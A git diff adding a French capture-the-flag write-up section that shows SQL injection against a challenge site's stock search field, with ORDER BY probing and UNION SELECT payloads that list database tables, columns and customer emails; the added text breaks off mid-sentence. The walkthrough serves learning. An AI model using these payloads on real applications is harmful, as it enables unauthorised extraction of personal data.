@@ -72,6 +72,8 @@ ___
 
 ![crypto](assets/img/crypto.png)
 
+___
+
 ## Web
 
 ![web](assets/img/web.png)
@@ -80,9 +82,72 @@ Le couple identifiant / mot de passe "admin - admin" permet de se connecter sur 
 
 ![admin](assets/img/web/admin.png)
 
+Dans l'onglet "[stock](https://challengecybersec.fr/4e9033c6eacf38dc2a5df7a14526bec1/stock)", il y a un champs qui permet de faire une recherche. Si l'on injecte le caractere "'", le message suivant apparait:
+
+![sqli](assets/img/web/sqli.png)
+
+Il est donc possible de faire une **injection SQL**!
+
+A priori la requete en backend doit ressembler a ca:
+
+```sql
+SELECT id_colis, objet, status, section, client FROM stocks
+WHERE objet LIKE '%<PAYLOAD>%' ORDER BY section ASC
+```
+
+Nous allons donc proceder de maniere iterative:
+
+`%' ORDER BY status ASC --`
+
+![You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--%' ORDER BY section ASC' at line 1](assets/img/web/--.png)
+
+`%' ORDER BY status ASC #`
+
+![Unknown column 'status' in 'order clause'](assets/img/web/status.png)
+
+Si on utilise ce payload: `%' ORDER BY section DESC #`, l'affichage des colonnes est effectivement inversee. 
+
+En ajoutant un `SELECT` a notre payload `%' ORDER BY section DESC;  SELECT * FROM information_schema.tables #`, le resultat du `SELECT` n'est pas affiche. De ce fait, nous allons devoir proceder a un `UNION` pour combiner les resultats.
+
+Si on utilise ce payload: `' UNION SELECT * FROM information_schema.tables#`, on observe l'erreur suivante:
+
+![error](assets/img/web/error.png)
+
+Il faut donc ajouter et/ou supprimer des colonnes.
+
+Listons les noms des tables:
+
+`' UNION SELECT table_name,1,2,3,4 FROM information_schema.tables#`
+
+![tables](assets/img/web/tables.png)
+
+> Les tables inherentes a MYSQL ne sont pas dans la capture d'ecran
+
+Listons les noms des colonnes de la table **customer**: 
+
+`' UNION SELECT column_name,1,2,3,4 FROM information_schema.columns WHERE TABLE_NAME='customer'#`
+
+![columns](assets/img/web/columns.png)
+
+Bien maintenant, listons les emails de la table **customer**:
+
+`' UNION SELECT email,1,2,3,4 FROM customer#`
+
+Et on tombe
+
+### Liens utiles
+
+- [Did You Order a SQL Injection?](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2019/march/did-you-order-a-sql-injection/)
+- [SQL List All Tables](https://www.sqltutorial.org/sql-list-all-tables/)
+- [**PayloadsAllTheThings**: SQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+
+___
+
 ## Algo
 
 ![algo](assets/img/algo.png)
+
+___
 
 ## Forensic
 
@@ -100,3 +165,4 @@ En effet, de nombreux fichiers sont présents dans cette image:
 
 ![Binwalk](assets/img/forensic/binwalk.png)
 
+___
